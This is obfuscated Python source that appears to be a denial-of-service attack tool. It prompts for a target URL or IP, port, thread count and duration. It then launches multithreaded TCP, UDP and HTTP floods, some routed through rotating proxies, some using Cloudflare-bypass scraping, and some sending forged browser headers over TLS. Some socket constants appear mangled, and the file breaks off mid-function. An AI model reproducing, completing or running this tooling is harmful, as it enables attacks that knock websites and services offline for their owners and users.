def IIlllIIIIlIIIIllI ():stdout .write (_IllllIIIIIIIllIll +Fore .WHITE +'URL      '+Fore .LIGHTGREEN_EX +_IIllIllIIIllllllI +Fore .LIGHTGREEN_EX );IIIIlIlIIllIIlIIl =input ();stdout .write (_IllllIIIIIIIllIll +Fore .WHITE +_IlIIIlllIIIIIlllI +Fore .LIGHTGREEN_EX +_IIllIllIIIllllllI +Fore .LIGHTGREEN_EX );IlIllIlIIlIIIIllI =input ();stdout .write (_IllllIIIIIIIllIll +Fore .WHITE +_IlIIIIIIlIIllIIll +Fore .LIGHTGREEN_EX +_IIllIllIIIllllllI +Fore .LIGHTGREEN_EX );IlIlIIllIIlllIlll =input ();return IIIIlIlIIllIIlIIl ,IlIllIlIIlIIIIllI ,IlIlIIllIIlllIlll 
def IlIIllllIlIllIlIl ():stdout .write (_IllllIIIIIIIllIll +Fore .WHITE +'IP       '+Fore .LIGHTGREEN_EX +_IIllIllIIIllllllI +Fore .LIGHTGREEN_EX );IllIllIIlllIlIlll =input ();stdout .write (_IllllIIIIIIIllIll +Fore .WHITE +'PORT     '+Fore .LIGHTGREEN_EX +_IIllIllIIIllllllI +Fore .LIGHTGREEN_EX );IIIIIIIlIllIllllI =input ();stdout .write (_IllllIIIIIIIllIll +Fore .WHITE +_IlIIIlllIIIIIlllI +Fore .LIGHTGREEN_EX +_IIllIllIIIllllllI +Fore .LIGHTGREEN_EX );IllIIIIIllIIIlllI =input ();stdout .write (_IllllIIIIIIIllIll +Fore .WHITE +_IlIIIIIIlIIllIIll +Fore .LIGHTGREEN_EX +_IIllIllIIIllllllI +Fore .LIGHTGREEN_EX );IIlIlIlIllIllIIll =input ();return IllIllIIlllIlIlll ,IIIIIIIlIllIllllI ,IllIIIIIllIIIlllI ,IIlIlIlIllIllIIll 
def IIllIlIlIIlIIIIII (IllllIIIllllIIllI ,IlIIIIlIIlIllllIl ,IlIlIIlllllIIIlIl ,IIllIllIIllllllll ):
	IIIIIIlIIIllllllI =datetime .datetime .now ()+datetime .timedelta (seconds =int (IIllIllIIllllllll ));IllllIlIIIIllIIlI =random ._urandom (4096 )
	for _IlllllllllIIlllII in range (int (IlIlIIlllllIIIlIl )):
		try :IIllllIIIIIlIlllI =threading .Thread (target =IIIIIIlIlIIIIlIll ,args =(IllllIIIllllIIllI ,IlIIIIlIIlIllllIl ,IllllIlIIIIllIIlI ,IIIIIIlIIIllllllI ));IIllllIIIIIlIlllI .start ()
		except :pass 
def IIIIIIlIlIIIIlIll (IllIIIIllIIIlIllI ,IIIIIllIlIIIlllIl ,IIIIIlIIlIlIIlIlI ,IIllllIIlllIIllIl ):
	with socket .socket (socket .AF_INET ,socket .SICK_STREAM )as IIlIllIllIIlllIIl :IIlIllIllIIlllIIl .setblocking (0 )
	while (IIllllIIlllIIllIl -datetime .datetime .now ()).total_seconds ()>0 :
		try :IIlIlIIIIIlIIIlII =random .randint (1 ,65535 )if IIIIIllIlIIIlllIl ==0 else IIIIIllIlIIIlllIl ;IIlIllIllIIlllIIl .connect ((IllIIIIllIIIlIllI ,IIlIlIIIIIlIIIlII ))
		except :pass 
def IlIlllllIllIIllII (IllIIlIlllIIIllIl ,IIIllIIllIIIlllIl ,IllllIllIllllIIII ,IIIllllllIIllIlII ):
	IIlIIlIIIIlIllIII =datetime .datetime .now ()+datetime .timedelta (seconds =int (IIIllllllIIllIlII ));IlllIIlIIIIlIllII =_IIIllllllIIlIlIII 
	for _IIIllIIIIIllIlIll in range (int (IllllIllIllllIIII )):
		try :IIllIIlllIlIIIIII =threading .Thread (target =IllIlIlIlIllIllll ,args =(IllIIlIlllIIIllIl ,IIIllIIllIIIlllIl ,IlllIIlIIIIlIllII ,IIlIIlIIIIlIllIII ));IIllIIlllIlIIIIII .start ()
		except :pass 
def IllIlIlIlIllIllll (IlIIlllllIlllllll ,IIIllIIlIlIIIIIII ,IllIlIlllIlllllll ,IIIIIlllIIIllllII ):
	IlIIIIIIIIllIIllI =socket .socket (socket .AF_INET ,socket .IPPRITI_IGMP )
	while (IIIIIlllIIIllllII -datetime .datetime .now ()).total_seconds ()>0 :
		try :IlIIIIIIIIllIIllI .sendto (_IIIllllllIIlIlIII ,(IlIIlllllIlllllll ,int (IIIllIIlIlIIIIIII )))
		except :IlIIIIIIIIllIIllI .close ();pass 
def IIIlIIlllIIllllIl (IIIIIIIIlllIlIIII ,IIIIIlIIIlIIIIllI ,IIlIIIllIIIlIIllI ,IIllIIlIIIlIIIlll ):
	IllIIIlIIIlIIllII =datetime .datetime .now ()+datetime .timedelta (seconds =int (IIllIIlIIIlIIIlll ));IIlIIlIlIlIlIlIlI =_IIIllllllIIlIlIII 
	for _IlllIlllIIIlIlIIl in range (int (IIlIIIllIIIlIIllI )):
		try :IllIlIlIIIllIIlll =threading .Thread (target =IlllllIIIIllIlIll ,args =(IIIIIIIIlllIlIIII ,IIIIIlIIIlIIIIllI ,IIlIIlIlIlIlIlIlI ,IllIIIlIIIlIIllII ));IllIlIlIIIllIIlll .start ()
		except :pass 
def IlllllIIIIllIlIll (IlIlIIIIllIIIIIll ,IIIIIllllllIlIlIl ,IllIlIlIllIllIlll ,IIIIIlIlIlIIIIllI ):
	IIIIIIlllIlllIIll =socket .socket (socket .AF_INET ,socket .IPPRITI_IGMP )
	while (IIIIIlIlIlIIIIllI -datetime .datetime .now ()).total_seconds ()>0 :
		try :IIIIIIlllIlllIIll .sendto (_IIIllllllIIlIlIII ,(IlIlIIIIllIIIIIll ,int (IIIIIllllllIlIlIl )))
		except :IIIIIIlllIlllIIll .close ();pass 
def IlllIIIlIlllllIlI (IllIIllIIIIlllIIl ,IllllllIIlIllIlII ,IIIIIlIIIlIllIlll ,IllllllIllllllIII ):
	IlIIIIIlllIlIlIIl =datetime .datetime .now ()+datetime .timedelta (seconds =int (IllllllIllllllIII ))
	for _IllIIIIlllllIllIl in range (int (IIIIIlIIIlIllIlll )):
		try :IIlIlIlIlIlIlIIll =threading .Thread (target =IIllIIlllllllIIIl ,args =(IllIIllIIIIlllIIl ,IllllllIIlIllIlII ,IlIIIIIlllIlIlIIl ,payload ));IIlIlIlIlIlIlIIll .start ()
		except :pass 
def IIllIIlllllllIIIl (IIIIIlIllIIllIlII ,IIIIlIlIIIlIIlIll ,IllIIllIlIIIIIIll ,IlIlIlllIIlIlIIlI ):
	IlIIIlIlIllIlIllI =socket .socket (socket .AF_INET ,socket .SICK_DGRAM );IlIIIlIlIllIlIllI .setsockopt (socket .SIL_SICKET ,socket .SI_REUSEADDR ,1 )
	while (IllIIllIlIIIIIIll -datetime .datetime .now ()).total_seconds ()>0 :
		try :IlIlIlllIIlIlIIlI =random ._urandom (1024 );IlIIIlIlIllIlIllI .sendto (IlIlIlllIIlIlIIlI ,(IIIIIlIllIIllIlII ,int (IIIIlIlIIIlIIlIll )))
		except :IlIIIlIlIllIlIllI .close ();pass 
def IlIIllIIIIlIIlIIl (IIIIIlllIllllllII ,IIlIllllllIlllIII ,IlIllllIlIllIIlIl ,IIIlllllIIlIIIlll ):
	IlIlllIIllIlIIllI =datetime .datetime .now ()+datetime .timedelta (seconds =int (IlIllllIlIllIIlIl ))
	for _IIlllIlIlllIIIlll in range (int (IIlIllllllIlllIII )):
		try :exec ('threading.Thread(target=Attack'+IIIlllllIIlIIIlll +', args=(url, until)).start()')
		except :pass 
def IlIlllIlIIIllIIll (IllIllIIIlIlIlIlI ,IlIIIIIllIIlIlIll ,IlIIlIllIIIlllllI ):
	IIlIIllIlIlIIlIII =datetime .datetime .now ()+datetime .timedelta (seconds =int (IlIIlIllIIIlllllI ))
	for _IllIllllIIlIlIlll in range (int (IlIIIIIllIIlIlIll )):
		try :IIlIlIlllllIllIll =threading .Thread (target =IlIIlIlllIlllIlII ,args =(IllIllIIIlIlIlIlI ,IIlIIllIlIlIIlIII ));IIlIlIlllllIllIll .start ()
		except :pass 
def IlIIlIlllIlllIlII (IlIlIllIlIIllllIl ,IIIlIIlIllIIIlIlI ):
	while (IIIlIIlIllIIIlIlI -datetime .datetime .now ()).total_seconds ()>0 :
		try :requests .head (IlIlIllIlIIllllIl );requests .head (IlIlIllIlIIllllIl )
		except :pass 
def IIlIIllIIlIlIllII (IlllIIlllIlIIlllI ,IlllIIIlIIllIIIII ,IllIIllIIllIllIII ):
	IIIlIIIlIIIllIIlI =datetime .datetime .now ()+datetime .timedelta (seconds =int (IllIIllIIllIllIII ))
	for _IllIIIlIIIIllIIlI in range (int (IlllIIIlIIllIIIII )):
		try :IIIlIllIIIIIIIllI =threading .Thread (target =IIIIllllIlllIIlIl ,args =(IlllIIlllIlIIlllI ,IIIlIIIlIIIllIIlI ));IIIlIllIIIIIIIllI .start ()
		except :pass 
def IIIIllllIlllIIlIl (IIIlIllllllIIIIIl ,IIllIIlIIlIIIIIII ):
	while (IIllIIlIIlIIIIIII -datetime .datetime .now ()).total_seconds ()>0 :
		try :requests .post (IIIlIllllllIIIIIl );requests .post (IIIlIllllllIIIIIl )
		except :pass 
def IlIIIIlIIIIIlIllI (IlIIIIllIIIIlllll ,IllIlIlIIIIlIIlII ,IlIllIIlIIlIlIlIl ):
	IIlIIllIIIIllllII =datetime .datetime .now ()+datetime .timedelta (seconds =int (IlIllIIlIIlIlIlIl ))
	for _IlIIIlIIlIlIlllIl in range (int (IllIlIlIIIIlIIlII )):
		try :IIIlllllIIIIIlIlI =threading .Thread (target =IIllIIlIIIlIlIIII ,args =(IlIIIIllIIIIlllll ,IIlIIllIIIIllllII ));IIIlllllIIIIIlIlI .start ()
		except :pass 
def IIllIIlIIIlIlIIII (IllIIIIllIlllIlIl ,IIIllIIlllIIlIIll ):
	while (IIIllIIlllIIlIIll -datetime .datetime .now ()).total_seconds ()>0 :
		try :requests .get (IllIIIIllIlllIlIl );requests .get (IllIIIIllIlllIlIl )
		except :pass 
def IlIIlIIIIIIllIIlI (IlIIlllIIllIIIlll ,IlIIllllIIIIlllII ,IIIIIllIlllllllIl ):
	IIllIlIIllIlIlIll =datetime .datetime .now ()+datetime .timedelta (seconds =int (IIIIIllIlllllllIl ))
	for _IllIIIlIlIIlllIll in range (int (IlIIllllIIIIlllII )):
		try :IIIIlIIIIIllllIII =threading .Thread (target =IlIlllIlIllIIlIlI ,args =(IlIIlllIIllIIIlll ,IIllIlIIllIlIlIll ));IIIIlIIIIIllllIII .start ()
		except :pass 
def IlIlllIlIllIIlIlI (IlIllIllIIIlIlIIl ,IlIlIIIlllIllllII ):
	while (IlIlIIIlllIllllII -datetime .datetime .now ()).total_seconds ()>0 :
		IIIIlIlllllllllIl =_IIllIIIlIlIIIlIlI +str (random .choice (list (IlllIIllIIlIIllII )));IIIIlIlllllllllIl ={'http':IIIIlIlllllllllIl ,_IlIIlIlIlIllllIIl :IIIIlIlllllllllIl }
		try :requests .get (IlIllIllIIIlIlIIl ,proxies =IIIIlIlllllllllIl );requests .get (IlIllIllIIIlIlIIl ,proxies =IIIIlIlllllllllIl )
		except :pass 
def IIlIIIlIIIlIllIll (IlIIlIIIIlIllIlIl ,IllIlIlIllllIllll ,IlIIlllIlIIllllll ):
	IlIllIIIIIIlIlIII =IlIIIlIIllIIllIIl (IlIIlIIIIlIllIlIl );IIllIlIIlIllIllll =datetime .datetime .now ()+datetime .timedelta (seconds =int (IlIIlllIlIIllllll ));IIIlllllllIIlIIII =random .choice (IllIlIlIIlllllllI );IlllIIIlIlIIIlIIl =random .choice (IIlIIllllllIIIlIl );IIIllIIIIllllIlIl =IIIlllllllIIlIIII +IlIIlIIIIlIllIlIl +IlIllIIIIIIlIlIII [_IlIlIIllllIIllIIl ]+_IIIIllIIIlIIllIII ;IIIllIIIIllllIlIl +=_IlIIlIllIIIIlIIlI +IlIllIIIIIIlIlIII [_IIlllIlIlIIIIllIl ]+_IIllIlIllIIIllIll ;IIIllIIIIllllIlIl +=IlllIIIlIlIIIlIIl +_IIllIlIllIIIllIll ;IIIllIIIIllllIlIl +=_IllllIlIlIlIIlIIl ;IIIllIIIIllllIlIl +=_IIIlllIlllIlIllll 
	for _IlIIIlllIIIIllIII in range (int (IllIlIlIllllIllll )):
		try :IIIlIIIlIIIIIlllI =threading .Thread (target =IIIIIlIlIlllIIlII ,args =(IlIllIIIIIIlIlIII ,IIllIlIIlIllIllll ,IIIllIIIIllllIlIl ));IIIlIIIlIIIIIlllI .start ()
		except :pass 
def IIIIIlIlIlllIIlII (IIlIIllllIlllIIIl ,IlIIllIllIIlIlIIl ,IllllllIlllIllllI ):
	while (IlIIllIllIIlIlIIl -datetime .datetime .now ()).total_seconds ()>0 :
		try :
			IIllIIlllIIIIIlII =random .choice (list (IlllIIllIIlIIllII )).split (_IIIIlIlIlIlllIIll )
			if IIlIIllllIlllIIIl [_IlIlllllIIlIlIllI ]==_IlIIlIlIlIllllIIl :IIllllIIIlIlllIll =socks .socksocket ();IIllllIIIlIlllIll .setsockopt (socket .IPPRITI_TCP ,socket .TCP_NIDELAY ,1 );IIllllIIIlIlllIll .set_proxy (socks .HTTP ,str (IIllIIlllIIIIIlII [0 ]),int (IIllIIlllIIIIIlII [1 ]));IIllllIIIlIlllIll .connect ((str (IIlIIllllIlllIIIl [_IIlllIlIlIIIIllIl ]),int (IIlIIllllIlllIIIl [_IIllIllIIIIllIlIl ])));IIllllIIIlIlllIll =ssl .create_default_context ().wrap_socket (IIllllIIIlIlllIll ,server_hostname =IIlIIllllIlllIIIl [_IIlllIlIlIIIIllIl ])
			else :IIllllIIIlIlllIll =socks .socksocket ();IIllllIIIlIlllIll .setsockopt (socket .IPPRITI_TCP ,socket .TCP_NIDELAY ,1 );IIllllIIIlIlllIll .set_proxy (socks .HTTP ,str (IIllIIlllIIIIIlII [0 ]),int (IIllIIlllIIIIIlII [1 ]));IIllllIIIlIlllIll .connect ((str (IIlIIllllIlllIIIl [_IIlllIlIlIIIIllIl ]),int (IIlIIllllIlllIIIl [_IIllIllIIIIllIlIl ])))
			try :
				for _IIlIIIlIlllIIllII in range (100 ):IIllllIIIlIlllIll .send (str .encode (IllllllIlllIllllI ))
			except :IIllllIIIlIlllIll .close ()
		except :return 
def IllIIIIlIIllllIlI (IIlIIlIIlIIIlllIl ,IIlllIIIlIlIIllII ,IlllIIllIlIIIIllI ):
	IllIlIllIlIIllIII =IlIIIlIIllIIllIIl (IIlIIlIIlIIIlllIl );IIIlIIlIlIllIIIIl =datetime .datetime .now ()+datetime .timedelta (seconds =int (IlllIIllIlIIIIllI ));IlIlIIIIlIIIIIIlI =random .choice (IllIlIlIIlllllllI );IIIlllIlIlllllllI =random .choice (IIlIIllllllIIIlIl );IIllllllIlIIlIIlI =IlIlIIIIlIIIIIIlI +IIlIIlIIlIIIlllIl +IllIlIllIlIIllIII [_IlIlIIllllIIllIIl ]+_IlIlllIlIlIllIIlI +IllIlIllIlIIllIII [_IIlllIlIlIIIIllIl ]+_IIllIlIllIIIllIll ;IIllllllIlIIlIIlI +=IIIlllIlIlllllllI +_IIllIlIllIIIllIll ;IIllllllIlIIlIIlI +=_IllllIlIlIlIIlIIl ;IIllllllIlIIlIIlI +=_IIIlllIlllIlIllll 
	for _IlIIlIIlIIIlIllll in range (int (IIlllIIIlIlIIllII )):
		try :IlllIIIllIIllIlII =threading .Thread (target =IIIllIIIlIlIlIIlI ,args =(IllIlIllIlIIllIII ,IIIlIIlIlIllIIIIl ,IIllllllIlIIlIIlI ));IlllIIIllIIllIlII .start ()
		except :pass 
def IIIllIIIlIlIlIIlI (IlIllllIlIllIIIII ,IllIlIlIlIlllllII ,IlIIIIIIIIlIIIlIl ):
	if IlIllllIlIllIIIII [_IlIlllllIIlIlIllI ]==_IlIIlIlIlIllllIIl :IllllIllIlIllllII =socks .socksocket ();IllllIllIlIllllII .setsockopt (socket .IPPRITI_TCP ,socket .TCP_NIDELAY ,1 );IllllIllIlIllllII .connect ((str (IlIllllIlIllIIIII [_IIlllIlIlIIIIllIl ]),int (IlIllllIlIllIIIII [_IIllIllIIIIllIlIl ])));IllllIllIlIllllII =ssl .create_default_context ().wrap_socket (IllllIllIlIllllII ,server_hostname =IlIllllIlIllIIIII [_IIlllIlIlIIIIllIl ])
	else :IllllIllIlIllllII =socks .socksocket ();IllllIllIlIllllII .setsockopt (socket .IPPRITI_TCP ,socket .TCP_NIDELAY ,1 );IllllIllIlIllllII .connect ((str (IlIllllIlIllIIIII [_IIlllIlIlIIIIllIl ]),int (IlIllllIlIllIIIII [_IIllIllIIIIllIlIl ])))
	while (IllIlIlIlIlllllII -datetime .datetime .now ()).total_seconds ()>0 :
		try :
			try :
				for _IlIIlIIIIllIlllII in range (100 ):IllllIllIlIllllII .send (str .encode (IlIIIIIIIIlIIIlIl ))
			except :IllllIllIlIllllII .close ()
		except :pass 
def IlIIlIlIIllIlIIll (IIlIIlIllIlIIlIIl ,IIIlIlIllIlIIIlIl ,IlIIIIllIIIIIlIII ):
	IllIIIIlIlIlllIll =IlIIIlIIllIIllIIl (IIlIIlIllIlIIlIIl );IlIIIlIlllIlllIll =random .choice (IIlIIllllllIIIlIl );IllIIlIIlIllIllII =datetime .datetime .now ()+datetime .timedelta (seconds =int (IlIIIIllIIIIIlIII ));IlIIIllllIIIIllll =random .choice (IllIlIlIIlllllllI );IlIIIlIlllIlllIll =random .choice (IIlIIllllllIIIlIl );IlIlIIlIIlIllllII =IlIIIllllIIIIllll +IIlIIlIllIlIIlIIl +IllIIIIlIlIlllIll [_IlIlIIllllIIllIIl ]+'?'+str (random .randint (1 ,1000 ))+'='+str (random .randint (1 ,1000 ))+_IlIlllIlIlIllIIlI +IllIIIIlIlIlllIll [_IIlllIlIlIIIIllIl ]+_IIllIlIllIIIllIll ;IlIlIIlIIlIllllII +=IlIIIlIlllIlllIll +_IIllIlIllIIIllIll ;IlIlIIlIIlIllllII +=_IllllIlIlIlIIlIIl ;IlIlIIlIIlIllllII +='Connection: Keep-Alive\r\nCache-Control: no-cache\r\n\r\n'
	for _IIllllIIlllIIlIII in range (int (IIIlIlIllIlIIIlIl )):
		try :IlIlIlllIIlIlIIII =threading .Thread (target =IlIIIlIlllIIlIlll ,args =(IllIIIIlIlIlllIll ,IllIIlIIlIllIllII ,IlIlIIlIIlIllllII ));IlIlIlllIIlIlIIII .start ()
		except :pass 
def IlIIIlIlllIIlIlll (IIlIlllIIIIlIllIl ,IllIlIIIlIlIIlIll ,IlIIIIlIIIlIIIlIl ):
	if IIlIlllIIIIlIllIl [_IlIlllllIIlIlIllI ]==_IlIIlIlIlIllllIIl :IIIIIlIlIlllIlIlI =socks .socksocket ();IIIIIlIlIlllIlIlI .setsockopt (socket .IPPRITI_TCP ,socket .TCP_NIDELAY ,1 );IIIIIlIlIlllIlIlI .connect ((str (IIlIlllIIIIlIllIl [_IIlllIlIlIIIIllIl ]),int (IIlIlllIIIIlIllIl [_IIllIllIIIIllIlIl ])));IIIIIlIlIlllIlIlI =ssl .create_default_context ().wrap_socket (IIIIIlIlIlllIlIlI ,server_hostname =IIlIlllIIIIlIllIl [_IIlllIlIlIIIIllIl ])
	else :IIIIIlIlIlllIlIlI =socks .socksocket ();IIIIIlIlIlllIlIlI .setsockopt (socket .IPPRITI_TCP ,socket .TCP_NIDELAY ,1 );IIIIIlIlIlllIlIlI .connect ((str (IIlIlllIIIIlIllIl [_IIlllIlIlIIIIllIl ]),int (IIlIlllIIIIlIllIl [_IIllIllIIIIllIlIl ])));IIlIllIIllIIllIlI =ssl .create_default_context ();IIIIIIIlIIllIIIII =[_IlIlIIllIIllllIlI ];IIlIllIIllIIllIlI .set_ciphers (IIIIIIIlIIllIIIII );IIIIIlIlIlllIlIlI =IIlIllIIllIIllIlI .wrap_socket (IIIIIlIlIlllIlIlI ,server_hostname =urlparse (url ).netloc )
	while (IllIlIIIlIlIIlIll -datetime .datetime .now ()).total_seconds ()>0 :
		try :
			try :
				for _IlIlIIlllllIIIIII in range (100 ):IIIIIlIlIlllIlIlI .send (str .encode (IlIIIIlIIIlIIIlIl ))
			except :IIIIIlIlIlllIlIlI .close ()
		except :pass 
def IIIllIIIlllllllII (IllllllIIlllIIllI ,IIlllIlIlIIIIlIlI ,IllIlIIlIIlIlIIII ):
	IIllIIIlllIIIIIll =datetime .datetime .now ()+datetime .timedelta (seconds =int (IllIlIIlIIlIlIIII ));IIlIlllIlIlIIIllI =cloudscraper .create_scraper ()
	for _IllIIlllllIlIIIlI in range (int (IIlllIlIlIIIIlIlI )):
		try :IIlIllIlIlllIllIl =threading .Thread (target =IllllllIllIIllllI ,args =(IllllllIIlllIIllI ,IIllIIIlllIIIIIll ,IIlIlllIlIlIIIllI ));IIlIllIlIlllIllIl .start ()
		except :pass 
def IllllllIllIIllllI (IlIIIIllIllIlIlll ,IIlllllIlllIlllII ,IllIIlIlIlllllIll ):
	while (IIlllllIlllIlllII -datetime .datetime .now ()).total_seconds ()>0 :
		for _IIllIIIIIlllIIlll in range (100 ):
			try :IllIIlIlIlllllIll .get (IlIIIIllIllIlIlll ,timeout =5 );IllIIlIlIlllllIll .post (IlIIIIllIllIlIlll ,timeout =5 );IllIIlIlIlllllIll .head (IlIIIIllIllIlIlll ,timeout =5 )
			except :pass 
def IlIIllIlIIlIlIlll (IIlIlllllIIllIIll ,IIIllIIlllllllIll ,IllllIIIllIllIlll ):
	for IlIlIIlllIIllIlIl in range (int (IllllIIIllIllIlll )):threading .Thread (target =IIlIllIIIIIIlllII ,args =(IIlIlllllIIllIIll ,IIIllIIlllllllIll )).start ()
def IIlIllIIIIIIlllII (IlllIIlIlIIlllIII ,IIIIlIIIlllIlIllI ):
	IllIlllIIlIlllIIl =open (_IlllIllIIIllIIlIl ,_IIllIIIllIlIIlIll ).read ().split (_IIllIIIlIIlIIlIII );IIlllIIllllIllllI =random .choice (IllIlllIIlIlllIIl ).strip ().split (_IIIIlIlIlIlllIIll );IIIlIllIIIIIlllIl =time .time ()+int (IIIIlIIIlllIlIllI );IIIllIIIIllllllII =random .choice (IllIlIlIIlllllllI );IlIIllIIIllIlIllI =random .choice (IIlIIllllllIIIlIl );IIIIIIllIllIlllIl =IIIllIIIIllllllII +IlllIIlIlIIlllIII +' / HTTP/1.3\r\nHost: '+urlparse (IlllIIlIlIIlllIII ).netloc +_IIllIlIllIIIllIll ;IIIIIIllIllIlllIl +=_IllIlIIlIIIlIIlIl ;IIIIIIllIllIlllIl +=IlIIllIIIllIlIllI +_IIllIlIllIIIllIll ;IIIIIIllIllIlllIl +=_IllllIlIlIlIIlIIl ;IIIIIIllIllIlllIl +=_IIlIIIllIIlIIllIl ;IIIIIIllIllIlllIl +=_IlIIIlIIIIIIIIIIl ;IIIIIIllIllIlllIl +=_IIIllllllIllllIII ;IIIIIIllIllIlllIl +=_IllIlIllIlllllllI ;IIIIIIllIllIlllIl +=_IllllIIlIlIIlIlll ;IIIIIIllIllIlllIl +=_IIIlllIlllIlIllll 
	while time .time ()<IIIlIllIIIIIlllIl :
		try :
			IIlIllllIlIllIIII =socks .socksocket ();IIlIllllIlIllIIII .set_proxy (socks .HTTP ,str (IIlllIIllllIllllI [0 ]),int (IIlllIIllllIllllI [1 ]));IIlIllllIlIllIIII .setsockopt (socket .SIL_SICKET ,socket .SI_REUSEADDR ,1 );IIlIllllIlIllIIII .connect ((str (urlparse (IlllIIlIlIIlllIII ).netloc ),int (443 )));IIIlIIllIIIIIIIll =ssl .create_default_context ();IlIllIIlllIIIIIIl =[_IlIlIIllIIllllIlI ];IIIlIIllIIIIIIIll .set_ciphers (IlIllIIlllIIIIIIl );IIlIllllIlIllIIII =IIIlIIllIIIIIIIll .wrap_socket (IIlIllllIlIllIIII ,server_hostname =urlparse (IlllIIlIlIIlllIII ).netloc );IIlIllllIlIllIIII .send (str .encode (IIIIIIllIllIlllIl ))
			try :
				for _IlIlIIlIIllllIllI in range (200 ):IIlIllllIlIllIIII .send (str .encode (IIIIIIllIllIlllIl ));IIlIllllIlIllIIII .send (str .encode (IIIIIIllIllIlllIl ))
			except :IIlIllllIlIllIIII .close ()
		except :IIlIllllIlIllIIII .close ()
def IlIIIllIIIIIIlllI (IllIlllIIIlllIlIl ,IllllllIIllIIllIl ,IIlIIlllIlIllllIl ):
	IllIIIllIIIIlIlII =datetime .datetime .now ()+datetime .timedelta (seconds =int (IIlIIlllIlIllllIl ));IIIllIlIllIIIIlII =requests .Session ();IllIllIIlIIlllIIl =cloudscraper .create_scraper (sess =IIIllIlIllIIIIlII );IIlIIIllIlIlIlIlI =RequestsCookieJar ();IIlIIIllIlIlIlIlI .set (IllIllllIIlIIIlll [_IlllIIlIllllllIIl ],IllIllllIIlIIIlll ['value']);IllIllIIlIIlllIIl .cookies =IIlIIIllIlIlIlIlI 
	for _IIllIllIlIIIIIlll in range (int (IllllllIIllIIllIl )):
		try :IIIlllIllIIlllIII =threading .Thread (target =IlIlllIIIlIIIIlll ,args =(IllIlllIIIlllIlIl ,IllIIIllIIIIlIlII ,IllIllIIlIIlllIIl ));IIIlllIllIIlllIII .start ()
		except :pass 
def IlIlllIIIlIIIIlll (IllIIlIlIIIlIIIII ,IIIIlIlllIllllllI ,IllIIIlIIIIIllIll ):
	IlIIllllIlIlllIII ={_IlIIlIlIIIIllIlll :_IllIIIIIlIlllIlll ,_IllIIIIllIllIllIl :_IIllIlllIlIlIIlII ,_IlIIIlIllIIIIlllI :_IIllIIIIllIIIIllI ,_IllIIIIIlIIlllIIl :_IllllIlllllllllIl ,_IlllllIlIIlIIlIII :_IIIIIlIlllIIlIIII ,'Pragma':_IIIIIlIlllIIlIIII ,_IllIlIlIIIIIIllll :_IlIllllIIllIlIllI ,_IlIllIlIIlIIlIIIl :'1',_IlllllIIlIlllllIl :'document',_IIlllIlIllIIIIlIl :'navigate',_IllIIlllIlllllIlI :_IIlIIIlIllIIlIIIl ,_IlIIlllIIllllIllI :'?1','TE':'trailers'}
	while (IIIIlIlllIllllllI -datetime .datetime .now ()).total_seconds ()>0 :
		try :IllIIIlIIIIIllIll .get (url =IllIIlIlIIIlIIIII ,headers =IlIIllllIlIlllIII ,allow_redirects =_IIlIlIIllllllIlIl );IllIIIlIIIIIllIll .get (url =IllIIlIlIIIlIIIII ,headers =IlIIllllIlIlllIII ,allow_redirects =_IIlIlIIllllllIlIl )
		except :pass 
def IIlIlIIIIlIlIIIll (IllIlllIIlIllIlII ,IIIIIlllIIllIlIII ,IlIIIIIlIIllllIII ):
	IllIllIlllIlIlIIl =datetime .datetime .now ()+datetime .timedelta (seconds =int (IlIIIIIlIIllllIII ));IIlllllIIlIlIllll =IlIIIlIIllIIllIIl (IllIlllIIlIllIlII );IIlIlllIlIIlllIIl ='GET '+IIlllllIIlIlIllll [_IlIlIIllllIIllIIl ]+_IIIIllIIIlIIllIII ;IIlIlllIlIIlllIIl +=_IlIIlIllIIIIlIIlI +IIlllllIIlIlIllll [_IIlllIlIlIIIIllIl ]+_IIllIlIllIIIllIll ;IIlIlllIlIIlllIIl +='Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n';IIlIlllIlIIlllIIl +='Accept-Encoding: gzip, deflate, br\r\n';IIlIlllIlIIlllIIl +='Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n';IIlIlllIlIIlllIIl +='Cache-Control: max-age=0\r\n';IIlIlllIlIIlllIIl +='Cookie: '+IIlIIIIIIlllIIlll +_IIllIlIllIIIllIll ;IIlIlllIlIIlllIIl +=f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n';IIlIlllIlIIlllIIl +='sec-ch-ua-mobile: ?0\r\n';IIlIlllIlIIlllIIl +='sec-ch-ua-platform: "Windows"\r\n';IIlIlllIlIIlllIIl +='sec-fetch-dest: empty\r\n';IIlIlllIlIIlllIIl +='sec-fetch-mode: cors\r\n';IIlIlllIlIIlllIIl +='sec-fetch-site: same-origin\r\n';IIlIlllIlIIlllIIl +='Connection: Keep-Alive\r\n';IIlIlllIlIIlllIIl +='User-Agent: '+IlIllllIIlIIlIIII +'\r\n\r\n\r\n'
	for _IIIlIllIIlIIlIIIl in range (int (IIIIIlllIIllIlIII )):
		try :IIllIIlllllllllIl =threading .Thread (target =IIlllIllIlIIIllII ,args =(IllIllIlllIlIlIIl ,IIlllllIIlIlIllll ,IIlIlllIlIIlllIIl ));IIllIIlllllllllIl .start ()
		except :pass 
def IIlllIllIlIIIllII (IlllllIIIIllIIIII ,IIIlIIIIlIIIIllII ,IIIIIlllIllIlIlll ):
	if IIIlIIIIlIIIIllII [_IlIlllllIIlIlIllI ]==_IlIIlIlIlIllllIIl :IIIIlllIIIlIIIIlI =socks .socksocket ();IIIIlllIIIlIIIIlI .setsockopt (socket .IPPRITI_TCP ,socket .TCP_NIDELAY ,1 );IIIIlllIIIlIIIIlI .connect ((str (IIIlIIIIlIIIIllII [_IIlllIlIlIIIIllIl ]),int (IIIlIIIIlIIIIllII [_IIllIllIIIIllIlIl ])));IIIIlllIIIlIIIIlI =ssl .create_default_context ().wrap_socket (IIIIlllIIIlIIIIlI ,server_hostname =IIIlIIIIlIIIIllII [_IIlllIlIlIIIIllIl ])
	else :IIIIlllIIIlIIIIlI =socks .socksocket ();IIIIlllIIIlIIIIlI .setsockopt (socket .IPPRITI_TCP ,socket .TCP_NIDELAY ,1 );IIIIlllIIIlIIIIlI .connect ((str (IIIlIIIIlIIIIllII [_IIlllIlIlIIIIllIl ]),int (IIIlIIIIlIIIIllII [_IIllIllIIIIllIlIl ])))
	while (IlllllIIIIllIIIII -datetime .datetime .now ()).total_seconds ()>0 :
		try :
			for _IIIIIlIllllIIlIIl in range (10 ):IIIIlllIIIlIIIIlI .send (str .encode (IIIIIlllIllIlIlll ))
